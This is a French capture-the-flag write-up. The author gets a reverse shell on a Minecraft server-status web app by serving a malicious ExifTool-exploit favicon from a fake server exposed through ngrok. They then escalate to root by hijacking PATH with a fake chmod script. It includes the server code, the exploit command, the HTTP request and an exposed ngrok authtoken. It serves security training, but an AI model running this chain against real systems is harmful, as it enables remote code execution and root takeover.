Old School Markus
======================

On peut contacter un serveur minecaft pour obtenir ses informations.

On peut voir un paramètre caché dans a le formulaire : debug=debug_for_admin_20983rujf2j1i2

Si on l'ajoute on peut voir dans le code html : 

.. code-block:: console

    <!-- Exiftool Version: 12.23, Taille du fichier: 4672 -->


On va donc créer un faux serveur minecraft via python, et l'exposé avec ngrok. 

On demande a GPT un script de base : 

.. code-block:: python 

    import socket
    import struct
    import json

    # Configuration du serveur
    HOST = '0.0.0.0'
    PORT = 25565

    # Réponse JSON simulée
    status_response = json.dumps({
        "version": {
            "name": "1.20.1",
            "protocol": 763
        },
        "players": {
            "max": 100,
            "online": 5,
            "sample": [
                {"name": "Alice", "id": "UUID-ALICE"},
                {"name": "Bob", "id": "UUID-BOB"}
            ]
        },
        "description": {
            "text": "§aServeur factice pour test"
        },
        "favicon": ""  # Icône optionnelle
    })


    def read_varint(s):
        """ Lit un varint depuis un socket """
        number = 0
        for i in range(5):
            byte = s.recv(1)
            if not byte:
                return 0
            byte = ord(byte)
            number |= (byte & 0x7F) << 7 * i
            if not byte & 0x80:
                break
        return number


    def write_varint(value):
        """ Encode un entier en varint (Minecraft) """
        result = b''
        while True:
            temp = value & 0x7F
            value >>= 7
            if value != 0:
                temp |= 0x80
            result += struct.pack('B', temp)
            if value == 0:
                break
        return result


    def handle_client(conn):
        try:
            # Lire le paquet de handshake
            packet_length = read_varint(conn)
            _ = conn.recv(packet_length)

            # Lire le paquet de status request
            _ = read_varint(conn)
            _ = conn.recv(1)  # Type 0x00: Request

            # Construction de la réponse JSON
            json_data = status_response.encode('utf-8')
            response_data = write_varint(len(json_data)) + json_data

            # Enveloppe dans un paquet Minecraft (type 0x00)
            packet = b'\x00' + response_data
            packet = write_varint(len(packet)) + packet

            conn.sendall(packet)

            # Optionnel : gestion du ping (paquet 0x01)
            ping_packet_len = read_varint(conn)
            if ping_packet_len:
                ping_packet = conn.recv(ping_packet_len)
                conn.sendall(write_varint(len(ping_packet) + 1) + b'\x01' + ping_packet)
        except Exception as e:
            print(f"Erreur : {e}")
        finally:
            conn.close()


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"Fake Minecraft Server en écoute sur {PORT}")
        while True:
            conn, addr = s.accept()
            print(f"Connexion de {addr}")
        handle_client(conn)


On récupère ensuite les informations via : http://57.128.112.118:11819/?server=7.tcp.eu.ngrok.io&port=16193 

On fait un faux serveur minecraft (merci GPT). 

La description doit contenir "CINEMA" et/ou "CANNES"

.. code-block:: python 

    "description": {
        "text": "CINEMA Cinema Cannes CANNES"
    }

Il doit y avoir 1 000 000 d'utilisateure online : 

.. code-block:: console

    "online": 1000000,

On voit maintenant les informations apparaître sur le site : 


.. code-block:: console 

    CINEMA Cinema Cannes CANNES§r

    Version : 1.20.1

    Joueurs : 1000000/100

    PAS DE FAVICON


On peut égalemenet charger une image : 

.. code-block:: console

     "favicon": "https://cdn.beeceptor.com/assets/images/logo-beeceptor-white-bg.svg" 


Il y a surement un exploit avec exiftool a réaliser. 

On a trouver cet exploit : https://www.exploit-db.com/exploits/50911 

On va l'utiliser avec cette commande pour faire un reverse shell : 

.. code-block:: console

    python3 50911.py -s 7.tcp.eu.ngrok.io 16445

Cela créé un fichier image.jpg prêt a l'emploi pour notre reverse shell

On modifie notre configuration ngrok pour forward 2 ports, un pour le serveur minecraft et un pour le reverse shell 

.. code-block:: console

    cat ~/.config/ngrok/ngrok.yml
    version: "3"
    agent:
        authtoken: 2gvnbz1Bfx5GS8wq8s15z12Pop8_2DPyVX1fYgbKZtpyx1pYk
    tunnels:
    first:
        addr: 25565
        proto: tcp
    second:
        addr: 1234
        proto: tcp

Et on lance ngrok avec "ngrok start --all"

Le code finale du serveur Minecraft : 

.. code-block:: python

    import socket
    import struct
    import json,base64

    # Configuration du serveur
    HOST = '0.0.0.0'
    PORT = 25565

    def load_favicon():
        try:
            with open("image.jpg", "rb") as f:
                encoded = base64.b64encode(f.read()).decode("utf-8")
                return f"data:image/png;base64,{encoded}"
        except FileNotFoundError:
            print("[WARN] favicon.png introuvable. Aucun favicon ne sera envoyé.")
            return ""

    favicon_data = load_favicon()

    # Réponse JSON simulée
    status_response = json.dumps({
        "version": {
            "name": "1.20.1",
            "protocol": 763
        },
        "players": {
            "max": 100,
            "online": 1000000,
            "sample": [
                {"name": "Alice", "id": "UUID-ALICE"},
                {"name": "Bob", "id": "UUID-BOB"}
            ]
        },
        "description": {
            "text": "CINEMA Cinema Cannes CANNES"
        },
        "favicon": favicon_data # Icône optionnelle
    })


    def read_varint(s):
        """ Lit un varint depuis un socket """
        number = 0
        for i in range(5):
            byte = s.recv(1)
            if not byte:
                return 0
            byte = ord(byte)
            number |= (byte & 0x7F) << 7 * i
            if not byte & 0x80:
                break
        return number


    def write_varint(value):
        """ Encode un entier en varint (Minecraft) """
        result = b''
        while True:
            temp = value & 0x7F
            value >>= 7
            if value != 0:
                temp |= 0x80
            result += struct.pack('B', temp)
            if value == 0:
                break
        return result


    def handle_client(conn):
        try:
            # Lire le paquet de handshake
            packet_length = read_varint(conn)
            _ = conn.recv(packet_length)

            # Lire le paquet de status request
            _ = read_varint(conn)
            _ = conn.recv(1)  # Type 0x00: Request

            # Construction de la réponse JSON
            json_data = status_response.encode('utf-8')
            response_data = write_varint(len(json_data)) + json_data

            # Enveloppe dans un paquet Minecraft (type 0x00)
            packet = b'\x00' + response_data
            packet = write_varint(len(packet)) + packet

            conn.sendall(packet)

            # Optionnel : gestion du ping (paquet 0x01)
            ping_packet_len = read_varint(conn)
            if ping_packet_len:
                ping_packet = conn.recv(ping_packet_len)
                conn.sendall(write_varint(len(ping_packet) + 1) + b'\x01' + ping_packet)
        except Exception as e:
            print(f"Erreur : {e}")
        finally:
            conn.close()


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"Fake Minecraft Server en écoute sur {PORT}")
        while True:
            conn, addr = s.accept()
            print(f"Connexion de {addr}")
            handle_client(conn)


Ensuite on lance cette requête sur le serveur : 

.. code-block:: console

    GET /?server=2.tcp.eu.ngrok.io&port=19&debug=debug_for_admin_20983rujf2j1i2 HTTP/1.1
    Host: 57.128.112.118:11266
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    X-PwnFox-Color: red
    Priority: u=0, ir

On obtient alors notre reverse shell ! 

On commence avec cette commande pour avoir un vrai bash : 

.. code-block:: console

    python -c 'import pty; pty.spawn("/bin/bash")'

On regarde la liste des fichiers, il y a bien un fichier flag.txt mais qui n'est pas lisible directement, pas les droits, seulement root, il faut donc privesc.

Il y a un binaire fix_permissions qui donne ceci : 

.. code-block:: console

    ./fix_permissions
    [*] Fixing permissions for files in /app/images 
    [*] Running as UID: 0
    [*] Command: chmod 400 *

On peut utiliser le PATH pour modifier le binaire "chmod" et forcer l'utilisation de notre chmod plutôt que l'originale : 

.. code-block:: console

    echo -e '#!/bin/bash\nid > /tmp/root_shell' > /tmp/chmod
    chmod +x /tmp/chmod
    export PATH=/tmp:$PATH
    ./fix_permissions
    cat /tmp/root_shell : uid=0(root) gid=0(root) groups=0(root),1000(flaskuser)

On modifie donc notre payload pour lire le flag : 

.. code-block:: console

    echo -e '#!/bin/bash\ncat /app/flag.txt > /tmp/root_shell' > /tmp/chmod

On obtient alors notre flag dans le fichier /tmp/root_shell : **SHLK{O!d_Sch0Ol_Guy_Ho1ds_Olds_V3rsions}**



